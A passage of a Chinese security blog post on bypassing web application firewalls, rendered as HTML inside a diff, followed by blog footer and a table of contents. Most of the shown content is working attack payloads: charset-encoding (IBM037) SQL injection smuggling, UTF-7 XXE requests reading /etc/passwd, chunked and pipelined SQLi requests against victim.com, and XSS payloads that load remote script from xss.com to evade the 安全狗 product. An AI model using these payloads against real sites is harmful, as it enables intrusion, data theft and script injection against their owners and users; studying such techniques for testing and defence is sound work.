class="title">paramEncode</span><span class="params">(params=<span class="string">""</span>, charset=<span class="string">"IBM037"</span>, encodeEqualSign=False, encodeAmpersand=False, urldecodeInput=True, urlencodeOutput=True)</span>:</span></span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    equalSign = <span class="string">"="</span></span><br><span class="line">    ampersand = <span class="string">"&amp;"</span></span><br><span class="line">    <span class="keyword">if</span> encodeEqualSign:</span><br><span class="line">       equalSign = equalSign.encode(charset)</span><br><span class="line">    <span class="keyword">if</span> encodeAmpersand:</span><br><span class="line">       ampersand = ampersand.encode(charset)</span><br><span class="line">    params_list = params.split(<span class="string">"&amp;"</span>)</span><br><span class="line">    <span class="keyword">for</span> param_pair <span class="keyword">in</span> params_list:</span><br><span class="line">       param, value = param_pair.split(<span class="string">"="</span>)</span><br><span class="line">       <span class="keyword">if</span> urldecodeInput:</span><br><span class="line">          param = urllib.unquote(param).decode(<span class="string">'utf8'</span>)</span><br><span class="line">          value = urllib.unquote(value).decode(<span class="string">'utf8'</span>)</span><br><span class="line">       param = param.encode(charset)</span><br><span class="line">       value = value.encode(charset)</span><br><span class="line">       <span class="keyword">if</span> urlencodeOutput:</span><br><span class="line">          param = urllib.quote_plus(param)</span><br><span class="line">          value = urllib.quote_plus(value)</span><br><span class="line">       <span class="keyword">if</span> result:</span><br><span class="line">          result += ampersand</span><br><span class="line">       result += param + equalSign + value</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># for IIS</span></span><br><span class="line"><span class="keyword">print</span> paramEncode(<span class="string">"input1='union all select * from users--"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># prints %89%95%97%A4%A3%F1=%7D%A4%95%89%96%95%40%81%93%93%40%A2%85%93%85%83%A3%40%5C%40%86%99%96%94%40%A4%A2%85%99%A2%60%60</span></span><br></pre></td></tr></table></figure>
+
+<p>编码后变成下面这段请求，可以成功进行bypass</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/sample.aspx?%89%95%97%A4%A3%F0=%A2%96%94%85%A3%88%89%95%87</span> HTTP/1.1</span><br><span class="line"><span class="attribute">HOST</span>: victim.com</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded; charset=ibm037</span><br><span class="line"><span class="attribute">Content-Length</span>: 115</span><br><span class="line"></span><br><span class="line">%89%95%97%A4%A3%F1=%7D%A4%95%89%96%95%40%81%93%93%40%A2%85%93%85%83%A3%40%5C%40%86%99%96%94%40%A4%A2%85%99%A2%60%60</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="left"><strong>目标</strong></th>
+<th align="left"><strong>Post</strong>(application/x-www-form-urlencoded) 【支持得编码格式，我们可以根据这些不常见得编码格式绕过各种waf】</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Nginx，uWSGI-Django-Python3</td>
+<td align="left">IBM037，IBM500，cp875，IBM1026，IBM273</td>
+</tr>
+<tr>
+<td align="left">Nginx，uWSGI-Django-Python2</td>
+<td align="left">IBM037，IBM500，cp875，IBM1026，utf-16，utf-32，utf-32BE，IBM424</td>
+</tr>
+<tr>
+<td align="left">Apache-TOMCAT8-JVM1.8-JSP</td>
+<td align="left">IBM037，IBM500，IBM870，cp875，IBM1026，IBM01140，IBM01141，IBM01142，IBM01143，IBM01144，IBM01145，IBM01146，IBM01147，IBM01148，IBM01149，utf-16，utf-32，utf-32BE，IBM273，IBM277，IBM278，IBM280， IBM284，IBM285，IBM290，IBM297，IBM420，IBM424，IBM-Thai，IBM871，cp1025</td>
+</tr>
+<tr>
+<td align="left">Apache-TOMCAT7-JVM1.6-JSP</td>
+<td align="left">IBM037，IBM500，IBM870，cp875，IBM1026，IBM01140，IBM01141，IBM01142，IBM01143，IBM01144，IBM01145，IBM01146，IBM01147，IBM01148，IBM01149，utf-16，utf-32，utf-32BE，IBM273，IBM277，IBM278，IBM280， IBM284，IBM285，IBM297，IBM420，IBM424，IBM-Thai，IBM871，cp1025</td>
+</tr>
+<tr>
+<td align="left">Apache -PHP5（mod_php和FastCGI）</td>
+<td align="left">None</td>
+</tr>
+<tr>
+<td align="left">IIS8-PHP7.1-FastCGI</td>
+<td align="left">None</td>
+</tr>
+<tr>
+<td align="left">IIS6、7.5、8、10 -ASP经典</td>
+<td align="left">None</td>
+</tr>
+<tr>
+<td align="left">IIS6、7.5、8、10 -ASPX（v4.x）</td>
+<td align="left">IBM037，IBM500，IBM870，cp875，IBM1026，IBM01047，IBM01140，IBM01141，IBM01142，IBM01143，IBM01144，IBM01145，IBM01146，IBM01147，IBM01148，IBM01149，utf-16，unicodeFFFE，utf-32，utf-32BE，IBM273，IBM277， IBM278，IBM280，IBM284，IBM285，IBM290，IBM297，IBM420，IBM423，IBM424，x-EBCDIC-KoreanExtended，IBM-Thai，IBM871，IBM880，IBM905，IBM00924，cp1025</td>
+</tr>
+</tbody></table>
+<h3 id="编码绕过WAF"><a href="#编码绕过WAF" class="headerlink" title="编码绕过WAF"></a>编码绕过WAF</h3><p>在xxe攻击中，以下攻击被WAF拦截</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/bWAPP/xxe-2.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.101</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-type</span>: text/xml; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span>: 228</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: security_level=0; PHPSESSID=605bac73f50d32d09e96fd20a3df17e8</span><br><span class="line"></span><br><span class="line">&lt;?xml version="1.0" encoding="UTF-7"?&gt;</span><br><span class="line">&lt;!DOCTYPE copyright[</span><br><span class="line">&lt;!ENTITY test SYSTEM  "/etc/password"&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;reset&gt;             </span><br><span class="line">  &lt;login&gt;&amp;test;&lt;/login&gt;            </span><br><span class="line">  &lt;secret&gt;login&lt;/secret&gt;</span><br><span class="line">&lt;/reset&gt;</span><br></pre></td></tr></table></figure>
+
+<p>对关键payload进行utf-7编码，成功绕过</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/bWAPP/xxe-2.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.101</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-type</span>: text/xml; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span>: 228</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: security_level=0; PHPSESSID=605bac73f50d32d09e96fd20a3df17e8</span><br><span class="line"></span><br><span class="line">&lt;?xml version="1.0" encoding="UTF-7"?&gt;</span><br><span class="line">&lt;!DOCTYPE copyright[</span><br><span class="line">+ADwAIQBFAE4AVABJAFQAWQAgAHQ-e+AHMAdAAgAFMAWQBTAFQARQBNACAAIAAiAC8-e+AHQAYwAvAHAAYQBzAHMAdwBvAHI-d+ACIAPg-</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;reset&gt;             </span><br><span class="line">  &lt;login&gt;&amp;test;&lt;/login&gt;            </span><br><span class="line">  &lt;secret&gt;login&lt;/secret&gt;</span><br><span class="line">&lt;/reset&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Chunked-绕过WAF"><a href="#Chunked-绕过WAF" class="headerlink" title="Chunked 绕过WAF"></a>Chunked 绕过WAF</h3><p>在进行测试时候发现下面这段请求被拦截,很明显带有注入特征</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/sample.aspx?input0=something</span> HTTP/1.1</span><br><span class="line"><span class="attribute">HOST</span>: victim.com</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span>: 41</span><br><span class="line"></span><br><span class="line">input1='union all select * from users--</span><br></pre></td></tr></table></figure>
+
+<p>在头部加入 Transfer-Encoding: chunked 之后，就代表这个报文采用了分块编码。这时，post请求报文中的数据部分需要改为用一系列分块来传输。每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的，也不包括分块数据结尾的，且最后需要用0独占一行表示结束。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/sample.aspx?input0=something</span> HTTP/1.1</span><br><span class="line"><span class="attribute">HOST</span>: victim.com</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span>: 110</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">5;</span></span><br><span class="line"><span class="attribute">input</span></span><br><span class="line"><span class="attribute">4;</span></span><br><span class="line">1='u</span><br><span class="line"><span class="attribute">5;</span></span><br><span class="line">nion </span><br><span class="line"><span class="attribute">4;</span></span><br><span class="line">all </span><br><span class="line"><span class="attribute">5;</span></span><br><span class="line"><span class="attribute">selec</span></span><br><span class="line"><span class="attribute">4;</span></span><br><span class="line">t * </span><br><span class="line"><span class="attribute">4;</span></span><br><span class="line"><span class="attribute">from</span></span><br><span class="line"><span class="attribute">5;</span></span><br><span class="line"> user</span><br><span class="line"><span class="attribute">3;</span></span><br><span class="line"><span class="attribute">s--</span></span><br><span class="line"><span class="attribute">0</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="pipline绕过WAF"><a href="#pipline绕过WAF" class="headerlink" title="pipline绕过WAF"></a>pipline绕过WAF</h3><p>原始请求带有明显特征被拦截</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/sample.aspx?input0=something&amp;input1='union+all+select+*+from+users--</span> HTTP/1.1</span><br><span class="line"><span class="attribute">HOST</span>: victim.com</span><br></pre></td></tr></table></figure>
+
+<p>http协议是由tcp协议封装而来，当浏览器发起一个http请求时，浏览器先和服务器建立起连接tcp连接，然后发送http数据包，其中包含了一个Connection字段，一般值为close，apache等容器根据这个字段决定是保持该tcp连接或是断开。当发送的内容太大，超过一个http包容量，需要分多次发送时，值会变成keep-alive，即本次发起的http请求所建立的tcp连接不断开，直到所发送内容结束Connection为close为止。 下面请求包可能存在绕过：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">HOST</span>: victim.com</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded; charset=utf-8</span><br><span class="line"><span class="attribute">Connection:keep-alive</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">GET / HTTP/1.1</span><br><span class="line"><span class="attribute">HOST</span>: victim.com</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded; charset=utf-8</span><br><span class="line"><span class="attribute">Connection:keep-alive</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">GET / HTTP/1.1</span><br><span class="line"><span class="attribute">HOST</span>: victim.com</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded; charset=utf-8</span><br><span class="line"><span class="attribute">Connection:keep-alive</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">GET / HTTP/1.1</span><br><span class="line"><span class="attribute">HOST</span>: victim.com</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded; charset=utf-8</span><br><span class="line"><span class="attribute">Connection:keep-alive</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">GET /sample.aspx?input0=something&amp;input1='union+all+select+*+from+users-- HTTP/1.1</span><br><span class="line"><span class="attribute">HOST</span>: victim.com</span><br></pre></td></tr></table></figure>
+
+<h3 id="xss编码绕过WAF"><a href="#xss编码绕过WAF" class="headerlink" title="xss编码绕过WAF"></a>xss编码绕过WAF</h3><p>原始请求带有明显特征被拦截</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /192.168.3.108/Less-1/index.php?id=&lt;svg/onload=alert()&gt;</span><br><span class="line">HTTP/1.1</span><br><span class="line"><span class="attribute">HOST</span>: victim.com</span><br></pre></td></tr></table></figure>
+
+<p>对关键payload进行unciode编码，成功绕过</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">//192.168.3.108/Less-1/index.php?id=%3Cmarquee%20onstart=\u0070r\u06f\u006dpt()%3E</span> HTTP/1.1</span><br><span class="line"><span class="attribute">HOST</span>: victim.com</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded; charset=utf-8</span><br><span class="line"><span class="attribute">Connection:keep-alive</span></span><br></pre></td></tr></table></figure>
+
+<p>或者对关键payload进行url编码</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">//192.168.3.108/Less-1/index.php?id=&lt;img/%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09/src=x</span> /onerror=alert(1)&gt; <span class="string"></span> HTTP/1.1</span><br><span class="line"><span class="attribute">HOST</span>: victim.com</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded; charset=utf-8</span><br><span class="line"><span class="attribute">Connection:keep-alive</span></span><br></pre></td></tr></table></figure>
+
+<p>marquee标签构造XSS站点 bypass 安全狗</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">192.168.3.108/Less-1/index.php?id=%3Cmarquee%20style=%22opacity:%200%22%20behavior=%22alternate%22%20onbounce=%22document.body.appendChild(document.createElement(%27scrip\x74%27)).src=`https://xss.com/1`%22%3E1</span>  <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="string">HOST:</span> victim.com</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded; charset=utf-8</span><br><span class="line"><span class="attribute">Connection:keep-alive</span></span><br></pre></td></tr></table></figure>
+
+<p>img标签构造XSS站点 bypass 安全狗</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">192.168.3.108/Less-1/index.php?id=&lt;img/%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09%09/src=x</span> /onerror=document.body.append<span class="keyword">C</span>hild(document.create<span class="keyword">E</span>lement('scrip\x74')).src=`https://xss.com/`&gt; <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="string">HOST:</span> victim.com</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded; charset=utf-8</span><br><span class="line"><span class="attribute">Connection:keep-alive</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>本人翻译链接 <a href="https://github.com/0xInfection/Awesome-WAF" target="_blank" rel="noopener">https://github.com/0xInfection/Awesome-WAF</a> 在原有得翻译基础上加上自己的思想，已经bypasss案例</p>
+</blockquote>
+<p>转自：<a href="https://www.t00ls.net/thread-53335-1-1.html" target="_blank" rel="noopener">https://www.t00ls.net/thread-53335-1-1.html</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2019/12/04/waf从入门到Bypass/" title="waf从入门到Bypass">https://wh0ale.github.io/2019/12/04/waf从入门到Bypass/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+          
+        
+        <div class="post-tags">
+            <a href="/tags/bypass/" rel="tag"><i class="fa fa-tag"></i># bypass</a>
+          
+        </div>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2019/12/01/安全面经/" rel="next" title="安全面经">
+                <i class="fa fa-chevron-left"></i> 安全面经
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">123</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">59</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#介绍"><span class="nav-number">1.</span> <span class="nav-text">介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#WAF如何工作："><span class="nav-number">1.1.</span> <span class="nav-text">WAF如何工作：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WAF如何防御："><span class="nav-number">1.2.</span> <span class="nav-text">WAF如何防御：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#如何识别WAF"><span class="nav-number">2.</span> <span class="nav-text">如何识别WAF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#识别waf技术"><span class="nav-number">2.1.</span> <span class="nav-text">识别waf技术</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#检测技术"><span class="nav-number">2.2.</span> <span class="nav-text">检测技术:</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#主流WAF指纹识别"><span class="nav-number">3.</span> <span class="nav-text">主流WAF指纹识别:</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#识别工具"><span class="nav-number">3.1.</span> <span class="nav-text">识别工具</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WAF绕过技巧"><span class="nav-number">4.</span> <span class="nav-text">WAF绕过技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Fuzzing绕过"><span class="nav-number">4.1.</span> <span class="nav-text">Fuzzing绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#测试受阻"><span class="nav-number">4.1.1.</span> <span class="nav-text">测试受阻</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#选择Fuzzing字典"><span class="nav-number">4.1.2.</span> <span class="nav-text">选择Fuzzing字典</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#脚本编写"><span class="nav-number">4.1.3.</span> <span class="nav-text">脚本编写</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL注入"><span class="nav-number">4.2.</span> <span class="nav-text">SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Step-1"><span class="nav-number">4.2.1.</span> <span class="nav-text">Step 1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Step-2"><span class="nav-number">4.2.2.</span> <span class="nav-text">Step 2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Step-3"><span class="nav-number">4.2.3.</span> <span class="nav-text">Step 3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Step-4"><span class="nav-number">4.2.4.</span> <span class="nav-text">Step 4</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Step-5"><span class="nav-number">4.2.5.</span> <span class="nav-text">Step 5</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Step-6"><span class="nav-number">4.2.6.</span> <span class="nav-text">Step 6</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Step-7"><span class="nav-number">4.2.7.</span> <span class="nav-text">Step 7</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Step-8"><span class="nav-number">4.2.8.</span> <span class="nav-text">Step 8</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Step-9"><span class="nav-number">4.2.9.</span> <span class="nav-text">Step 9</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#混淆"><span class="nav-number">4.3.</span> <span class="nav-text">混淆</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#大小写切换"><span class="nav-number">4.3.1.</span> <span class="nav-text">大小写切换</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#url编码"><span class="nav-number">4.3.2.</span> <span class="nav-text">url编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Unicode规范化"><span class="nav-number">4.3.3.</span> <span class="nav-text">Unicode规范化</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#HTML-Representation"><span class="nav-number">4.3.4.</span> <span class="nav-text">HTML Representation</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#混合编码"><span class="nav-number">4.3.5.</span> <span class="nav-text">混合编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用注释"><span class="nav-number">4.3.6.</span> <span class="nav-text">使用注释</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#双重编码"><span class="nav-number">4.3.7.</span> <span class="nav-text">双重编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#通配混淆"><span class="nav-number">4.3.8.</span> <span class="nav-text">通配混淆</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#动态有效载荷生成"><span class="nav-number">4.3.9.</span> <span class="nav-text">动态有效载荷生成</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" 